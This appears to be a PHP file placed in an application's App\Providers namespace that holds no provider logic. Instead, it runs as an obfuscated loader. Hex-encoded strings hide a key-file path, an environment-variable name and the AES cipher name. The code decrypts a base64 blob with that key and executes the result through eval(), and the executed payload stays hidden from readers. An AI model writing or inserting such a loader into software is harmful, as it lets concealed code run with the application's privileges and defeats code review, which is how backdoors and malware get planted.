<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('s1+rnYTAn/mVYXB6gjzfBA==');

$c=base64_decode(

'pGFlpRo6pPSpSMuHRZAuYroHu/gzvNwi4ofv9FJFaI1NCDtnB+IQRhsuYVuEkxlWzQ3PHgb4xk0V' .
'Nqlx/wqQ5DIwbbUPDDXP6zaN47snTkKbx7SBUhmSBgJpjYUcA5Bp80Q43Ph9cTQlvUXxV3EM0Keb' .
'KBABCgTkTSDRf71sj+oXJPZ3Vc4VwJBA0neQVhNcUdwHrr9Q6+DdFBIQgf1N7BL5M47c/gy8BhNQ' .
'2MDfqxzmZuZ4QQ8KEcQfcCcZPwh3pCu8/+5O3mdWSLB2NWHhvfZsjsqDQtrFeTjtXGzykkihE3Hw' .
'sJUOYBxM5hmIJVdxlCi/iilCdlwYxLNRRhAN2bTriYKI1KPGRQJi0GsvkZctoB4r4IYPNKVcN6/P' .
'cY/IyDK7CO4FhsOuV01FSnJZISXBDF8ycg0XZ7eOavzKw5u4WpigFlVjF3OppoPpgOv4OiGCJDCG' .
'DUtw8ZzvfoxevZJC5rVfWrJJmwcY/BZ8YjJBQJQ4+tj+9Vd1OZpkUvozRh3Qln0JuitJaq7Gwatb' .
'A6+1P9u3tV7bk/4JR7refUwChGhrc0y5ggj6+mbCq/lKORQw2IdR4bhLYxyIFKVQ1FK9sW1ltb5v' .
'2teRoaV9j7z3kyt9g3mg7EAALHuPqTHqGkTi+5GwbkubI8HpnCCL82LwYnXDDevliyJsos0J6kfX' .
'qj1UKkqBDskfhfVvBO7MWgGraukyKqK85ZnUCXOFzMSfBoPhoyldNlGrQ22qUVWH9TOofm3fk3YF' .
'B0j+/Enn+VFOs+xXMHBCEqHpeOL2n8ZsB+EQdIWUins2W6GzTuzsghwjC1oTUQ+m6WrzC89d+Q0B' .
'XnUoTP8qi+5LfeaSO0MR5zTwRKEV4BAcnaw2C8RnYYgRojoC6s7daq1D+cI9DldLv/fm29o3722x' .
'U5v1Zt06uuqxGtU7w2v0vyO4tO5jS00xnlZZuMX0jpDzRjXQ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

